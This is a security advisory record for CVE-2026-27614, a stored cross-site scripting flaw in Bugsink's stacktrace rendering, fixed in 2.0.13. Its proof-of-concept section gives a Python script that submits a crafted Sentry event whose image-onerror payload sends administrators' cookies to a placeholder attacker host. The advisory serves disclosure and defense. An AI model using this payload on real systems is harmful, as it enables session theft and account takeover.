advisory_id: GHSA-vp6q-7m36-pq3w
datasource_id: github_osv_importer_v2/GHSA-vp6q-7m36-pq3w
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vp6q-7m36-pq3w/GHSA-vp6q-7m36-pq3w.json
aliases:
  - CVE-2026-27614
summary: |
  Bugsink is vulnerable to Stored XSS via Pygments fallback in stacktrace rendering
  ### Summary

  An unauthenticated attacker who can submit events to a Bugsink project can store arbitrary JavaScript in an event.
  The payload executes only if a user explicitly views the affected Stacktrace in the web UI.

  ### Details

  When Pygments returns more lines than it was given (a known upstream quirk that triggers with Ruby heredoc-style input), `_pygmentize_lines()` in `theme/templatetags/issues.py:75-77` falls back to returning the raw input lines. `mark_safe()` at line 111-113 is then applied unconditionally - including to those unsanitized raw lines. Since DSN endpoints are public by Sentry protocol, no account is needed to inject. The payload sits in the database until an admin looks at the event.

  ```python
  # issues.py:75-77 - fallback path, no escaping
  if len(pygmented) != len(lines):
      return lines  # raw HTML returned here

  # issues.py:111-113 - unconditional mark_safe
  return [mark_safe(line) for line in result]
  ```

  ### Operational Signals

  Exploitation attempts are likely to generate the diagnostic event:

  ```
  "Pygments line count mismatch, falling back to unformatted code"
  ```

  Installations that monitor Bugsink with Bugsink (or otherwise alert on internal errors)
  may see this message as an issue. While the condition can occur benignly, unexpected
  occurrences, especially from unusual languages (specifically ruby), warrant review.


  ### PoC

  Send a Sentry event to `/api/<project-id>/store/` with a valid DSN:

  ```python
  import requests

  payload = {
      "exception": {"values": [{"stacktrace": {"frames": [{
          "filename": "app.rb",
          "lineno": 2,
          "pre_context": ["<<~HEREDOC", "  foo", "HEREDOC"],
          "context_line": "<img src=x onerror=fetch('//attacker/?c='+document.cookie)>",
          "post_context": []
      }]}}]}
  }

  requests.post(
      "http://bugsink-host/api/<project-id>/store/",
      json=payload,
      headers={"X-Sentry-Auth": "Sentry sentry_key=<dsn-public-key>, sentry_version=7"}
  )
  ```

  Open the event in the bugsink UI as any admin. Cookie exfiltrates immediately.

  ### Impact

  This is a stored XSS vulnerability.

  Successful exploitation requires:

  * The attacker can submit events to the project (i.e. knows the DSN or can access a client that uses it).
  * The Bugsink ingest endpoint is reachable to the attacker.
  * An administrator explicitly views the crafted event in the UI.

  Under those conditions, the attacker can execute JavaScript in the administrator’s browser
  and act with that user’s privileges within Bugsink.
impacted_packages:
  - purl: pkg:pypi/bugsink
    affected_versions: vers:pypi/<=2.0.12
    fixed_versions: vers:pypi/2.0.13
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vp6q-7m36-pq3w/GHSA-vp6q-7m36-pq3w.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/bugsink/bugsink
    reference_type:
    reference_id:
  - url: https://github.com/bugsink/bugsink/commit/e784d6aeb0d5f29b40c2779d2544c2b9ef097ee9
    reference_type:
    reference_id:
  - url: https://github.com/bugsink/bugsink/releases/tag/2.0.13
    reference_type:
    reference_id:
  - url: https://github.com/bugsink/bugsink/security/advisories/GHSA-vp6q-7m36-pq3w
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27614
    reference_type:
    reference_id: CVE-2026-27614
